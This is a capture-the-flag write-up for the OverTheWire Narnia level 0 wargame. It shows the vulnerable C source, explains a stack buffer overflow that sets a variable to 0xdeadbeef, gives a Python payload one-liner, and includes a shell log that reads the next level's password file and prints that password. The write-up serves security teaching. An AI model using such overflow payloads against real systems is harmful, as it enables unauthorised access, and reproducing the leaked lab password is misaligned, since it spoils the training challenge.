# username / password
ssh narnia0@narnia.labs.overthewire.org -p2226

narnia0 / narnia0
# Concept
* variable overwrite via buffer overflow
# Method of solve
* the binary's source is this:
```
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```
* in the binary, the `val` variable is set to `0x41414141`
* if the `val` variable is set to `0xdeadbeef`, then the `sh` binary is run with the permissions of the file owner, which is `narnia1`
* if we can get access as `narnia1`, then we read their password and get access to the next level
* the `buf` variable, which holds our user input, has a maximum size of 20 characters
* any user input in excess of 20 characters will over the buffer and overwrite other memory addresses
* from testing, we see that even sending 20 characters will overflow a null byte character `00` into the val variable
* so this payload will get us our interactive shell as the `narnia1` user

(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde\n")'; cat) | ./narnia0


narnia0@narnia:/narnia$ (python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde\n")'; cat) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
ls
narnia0  narnia0.c  narnia1  narnia1.c  narnia2  narnia2.c  narnia3  narnia3.c  narnia4  narnia4.c  narnia5  narnia5.c  narnia6  narnia6.c  narnia7  narnia7.c  narnia8  narnia8.c
whoami
narnia1


whoami
narnia1
cat /etc/narnia_pass/narnia1
WDcYUTG5ul

